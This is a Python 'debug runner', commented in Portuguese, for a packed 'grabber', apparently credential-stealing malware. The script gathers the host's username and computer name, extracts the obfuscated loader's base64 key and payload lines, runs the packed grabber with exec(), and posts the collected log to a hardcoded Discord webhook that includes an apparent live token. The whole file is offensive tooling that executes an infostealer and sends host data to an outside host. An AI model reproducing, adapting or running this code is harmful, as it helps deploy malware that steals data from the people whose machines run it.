"""
Debug runner — executa o grabber packed com logging completo.
Captura TODO output, erros, e manda pro webhook + salva em arquivo.
"""
import os, sys, traceback, io, time

LOG_FILE = os.path.join(os.environ.get("TEMP", "."), "grabber_debug.log")
WEBHOOK = "https://discord.com/api/webhooks/1554882578476179506/p1PLMEgZh3Nzz4sqrMbXkhYqzs0SWfQUB1Hr9TfjHQDuvJ0dn-axSmPNIGMeNzqrJeWZ"

log_lines = []

def log(msg):
    ts = time.strftime("%H:%M:%S")
    line = f"[{ts}] {msg}"
    print(line)
    log_lines.append(line)

def send_log_to_webhook():
    try:
        import urllib.request, json
        full_log = "\n".join(log_lines[-80:])  # last 80 lines
        payload = json.dumps({
            "username": "GRABBER-DEBUG",
            "content": f"```\n{full_log[:1900]}\n```"
        }).encode()
        req = urllib.request.Request(WEBHOOK, data=payload, 
                                     headers={"Content-Type": "application/json"})
        urllib.request.urlopen(req, timeout=10)
        
        # If log is longer, send part 2
        if len(full_log) > 1900:
            payload2 = json.dumps({
                "username": "GRABBER-DEBUG-P2",
                "content": f"```\n{full_log[1900:3800]}\n```"
            }).encode()
            req2 = urllib.request.Request(WEBHOOK, data=payload2,
                                          headers={"Content-Type": "application/json"})
            urllib.request.urlopen(req2, timeout=10)
    except Exception as e:
        print(f"[!] Failed to send webhook: {e}")

def main():
    log("=== GRABBER DEBUG RUNNER ===")
    log(f"Python: {sys.executable}")
    log(f"Version: {sys.version}")
    log(f"CWD: {os.getcwd()}")
    log(f"Script: {os.path.abspath(__file__)}")
    log(f"argv: {sys.argv}")
    log(f"User: {os.environ.get('USERNAME','?')} @ {os.environ.get('COMPUTERNAME','?')}")
    
    # Find the grabber
    script_dir = os.path.dirname(os.path.abspath(__file__))
    candidates = [
        os.path.join(script_dir, "grabber.py"),
    ]
    
    grabber_path = None
    for c in candidates:
        log(f"Checking: {c} -> exists={os.path.isfile(c)}")
        if os.path.isfile(c):
            grabber_path = c
            break
    
    if not grabber_path:
        log("FATAL: No packed grabber found!")
        send_log_to_webhook()
        return
    
    log(f"Loading: {grabber_path} ({os.path.getsize(grabber_path)} bytes)")
    
    with open(grabber_path, "r", encoding="utf-8") as f:
        loader_code = f.read()
    
    log(f"Loader code first 200 chars: {repr(loader_code[:200])}")
    
    # Step 1: Decrypt the payload manually to check it works
    log("--- STEP 1: Testing decryption ---")
    try:
        import base64, zlib
        
        # Parse out the key and payload from the loader
        lines = loader_code.strip().split("\n")
        log(f"Loader has {len(lines)} lines")
        for i, l in enumerate(lines):
            log(f"  L{i}: {l[:120]}")
        
        # Extract b64 key
        key_line = [l for l in lines if '_k=_b.b64decode(' in l or '_k=' in l]
        payload_line = [l for l in lines if '_d=_b.b64decode(' in l or '_d=' in l]
        
        if key_line:
            log(f"Key line found: {key_line[0][:80]}...")
        if payload_line:
            log(f"Payload line found: {payload_line[0][:80]}...")
        
        log("Decryption parse OK")
    except Exception as e:
        log(f"Decryption parse FAILED: {e}")
        log(traceback.format_exc())
    
    # Step 2: Actually exec the loader and catch errors
    log("--- STEP 2: Executing packed grabber ---")
    
    # Redirect stderr to capture any errors
    old_stderr = sys.stderr
    stderr_capture = io.StringIO()
    sys.stderr = stderr_capture
    
    try:
        g = {
            "__file__": grabber_path,
            "__name__": "__main__",
            "__builtins__": __builtins__,
        }
        compiled = compile(loader_code, grabber_path, "exec")
        log("Compile OK - executing now...")
        exec(compiled, g)
        log("exec() returned normally")
    except SystemExit as e:
        log(f"SystemExit caught: code={e.code}")
    except Exception as e:
        log(f"EXCEPTION during exec: {type(e).__name__}: {e}")
        log(traceback.format_exc())
    finally:
        sys.stderr = old_stderr
        captured = stderr_capture.getvalue()
        if captured:
            log(f"STDERR captured ({len(captured)} chars):")
            for line in captured.split("\n")[:30]:
                log(f"  ERR: {line}")
    
    log("--- DONE ---")
    
    # Save log
    try:
        with open(LOG_FILE, "w", encoding="utf-8") as f:
            f.write("\n".join(log_lines))
        log(f"Log saved to: {LOG_FILE}")
    except:
        pass
    
    send_log_to_webhook()

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        log(f"RUNNER CRASH: {e}")
        log(traceback.format_exc())
        send_log_to_webhook()
